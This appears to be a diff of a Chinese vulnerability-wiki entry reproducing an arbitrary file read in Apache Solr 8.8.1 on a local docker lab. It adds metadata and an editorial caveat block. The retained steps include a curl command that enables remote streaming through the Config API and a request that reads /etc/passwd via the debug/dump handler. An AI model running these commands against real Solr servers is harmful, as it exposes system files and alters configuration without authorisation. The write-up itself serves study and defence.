@@ -1,9 +1,50 @@
 ---
 version: "docker pull solr"
 source: "MrWQ/vulnerability-paper"
+title: "Apache Solr -- 8-8-1 任意文件读取漏洞 POC 复现（从 1day 熬成了 Nday）"
+product: "Apache Solr"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+identifier_status: "unknown"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_role: "unknown"
+prerequisites: "有core、Config API可写、debug/dump处理器可访问、进程可读文件；示例8.8.1"
+source_url: "https://mp.weixin.qq.com/s/aZX_EYv5f0l_jM-XQpbHTw"
+source_status: "recorded"
+side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
+id: "vw-fa158f137dfb2d5328abad1f"
+entity_id: "ve-fa158f137dfb2d5328abad1f"
+schema_version: "1"
 ---
 
 # Apache Solr -- 8-8-1 任意文件读取漏洞 POC 复现（从 1day 熬成了 Nday）
+
+<!-- vulwiki-editorial:start -->
+## 校订与适用边界
+
+- 适用前提：有core、Config API可写、debug/dump处理器可访问、进程可读文件；示例8.8.1
+- 证据范围：记录无core/配置关闭两个失败条件，表明这不是任意默认实例直接读文件。
+
+### 本次正文校订
+
+- 按实际内容修正 5 处代码围栏语言标记，保留其中方法与请求内容。
+
+### 尚未解决的证据缺口
+
+以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：
+
+- curl JSON含字面反斜线转义右花括号，标准JSON无效
+- 官方拒绝修复无公告证据，应描述信任边界/权限配置而非无条件漏洞
+- 更改core配置有持久副作用，需明确恢复；最新/前两天无日期
+- 补鉴权角色和读取权限边界
+
+本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
+<!-- vulwiki-editorial:end -->
+
+## 技术正文与历史材料
 
 <meta name="referrer" content="no-referrer"/>
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/aZX_EYv5f0l_jM-XQpbHTw)
@@ -23,13 +64,13 @@ Apache Solr 在前两天爆出来了个任意文件读取漏洞，而且官方�
 
 首先拉取镜像，这里自动就会拉取最新的版本：
 
-```
+```shell
 docker pull solr
 ```
 
 启动容器：
 
-```
+```shell
 docker run --name solr-8.8.1 -p 8983:8983 -itd solr
 ```
 
@@ -51,7 +92,7 @@ docker run --name solr-8.8.1 -p 8983:8983 -itd solr
 
 可以直接将相关的配置文件拷过去使用，首先进入交互模式：
 
-```
+```shell
 docker exec -it solr-8.8.1 /bin/bash
 ```
 
@@ -77,7 +118,7 @@ POC 复现‍
 
 这时需要先开启相关配置
 
-```
+```shell
 curl -d '{  "set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true\}\}' http://127.0.0.1:8983/solr/your_core_name/config -H 'Content-type:application/json'
 ```
 
@@ -85,7 +126,7 @@ curl -d '{  "set-property" : {"requestDispatcher.requestParsers.enableRemoteStre
 
 开启之后即可读取任意文件
 
-```
+```shell
 curl "http://127.0.0.1:8983/solr/your_core_name/debug/dump?param=ContentStreams" -F "stream.url=file:///etc/passwd"
 ```
 
